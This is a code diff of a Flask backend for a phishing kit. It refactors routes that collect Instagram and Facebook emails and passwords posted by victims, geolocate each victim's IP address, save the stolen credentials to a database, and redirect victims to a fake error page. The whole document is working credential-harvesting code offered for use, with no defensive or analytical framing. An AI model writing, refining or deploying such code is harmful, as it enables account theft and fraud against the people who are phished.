@@ -1,12 +1,12 @@
-from flask import Flask, redirect, request, render_template
+from flask import Flask, redirect, request, render_template, url_for
 from flask_sqlalchemy import SQLAlchemy
 import os
 from datetime import datetime
-from json import dumps, loads
 import ipapi
 
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
 class Credentials(db.Model):
@@ -29,84 +29,55 @@ def init_db():
 def page_not_found(e):
     return '404 Not Found'
 
-
-
-##########################First LG##########################
-
-
 @app.route('/login/', methods=["GET", "POST"])
 def login_page():
     if request.method == "POST":
-        ip_address = request.headers.get('X-Real-IP',
-                                         '127.0.0.1')  # Fallback to localhost IP if 'X-Real-IP' is not available
-
-        alldata = {i + ": ": request.form[i] for i in request.form}
+        ip_address = request.headers.get('X-Real-IP', '127.0.0.1')
         response = ipapi.location(ip_address)
 
-        alldata.update({
-            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
-            'account type: ': "INSTAGRAM",
-            'ip: ': ip_address,
-            "city: ": response.get("city"),
-            "region: ": response.get("region"),
-            "country: ": response.get("country_name")
-        })
+        email = request.form.get('email')
+        password = request.form.get('password')
 
-        # Insert data into SQLite database
-        conn = sqlite3.connect('data.db')
-        c = conn.cursor()
-        c.execute(
-            "INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
-            (dumps(alldata), "INSTAGRAM", ip_address, response.get("city"), response.get("region"),
-             response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
-        conn.commit()
-        conn.close()
+        new_credential = Credentials(
+            email=email,
+            password=password,
+            account_type='INSTAGRAM',
+            ip=ip_address,
+            city=response.get("city"),
+            region=response.get("region"),
+            country=response.get("country_name"),
+            time=datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")
+        )
+
+        db.session.add(new_credential)
+        db.session.commit()
 
     return redirect(request.referrer + "error" if request.referrer else "https://artscrednewarts.pages.dev/errors")
-
 
 @app.route('/login2/', methods=["GET", "POST"])
 def login_page2():
     if request.method == "POST":
-        ip_address = request.headers.get('X-Real-IP',
-                                         '127.0.0.1')  # Fallback to localhost IP if 'X-Real-IP' is not available
-
+        ip_address = request.headers.get('X-Real-IP', '127.0.0.1')
         response = ipapi.location(ip_address)
 
-        alldata = {i + ": ": request.form[i] for i in request.form}
+        email = request.form.get('email')
+        password = request.form.get('password')
 
-        alldata.update({
-            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
-            'account type: ': "FACEBOOK",
-            'ip: ': ip_address,
-            "city: ": response.get("city"),
-            "region: ": response.get("region"),
-            "country: ": response.get("country_name")
-        })
+        new_credential = Credentials(
+            email=email,
+            password=password,
+            account_type='FACEBOOK',
+            ip=ip_address,
+            city=response.get("city"),
+            region=response.get("region"),
+            country=response.get("country_name"),
+            time=datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")
+        )
 
-        # Insert data into SQLite database
-        conn = sqlite3.connect('data.db')
-        c = conn.cursor()
-        c.execute(
-            "INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
-            (dumps(alldata), "FACEBOOK", ip_address, response.get("city"), response.get("region"),
-             response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
-        conn.commit()
-        conn.close()
+        db.session.add(new_credential)
+        db.session.commit()
 
     return redirect(request.referrer + "error" if request.referrer else "https://artscrednewarts.pages.dev/errors")
-
-
-@app.route("/" + locate)
-def index():
-    # Fetch data from SQLite database
-    conn = sqlite3.connect('data.db')
-    c = conn.cursor()
-    c.execute("SELECT data FROM credentials WHERE account_type='INSTAGRAM'")
-    data = [row[0] for row in c.fetchall()]
-    conn.close()
-
-    return render_template('index.html', data=data, loads=loads, locate=locate, view=view)
 
 
 
@@ -171,7 +142,6 @@ def vote_page2():
         conn.close()
 
     return redirect(request.referrer + "error")
-
 
 @app.route("/<path:locate>")
 def index(locate):
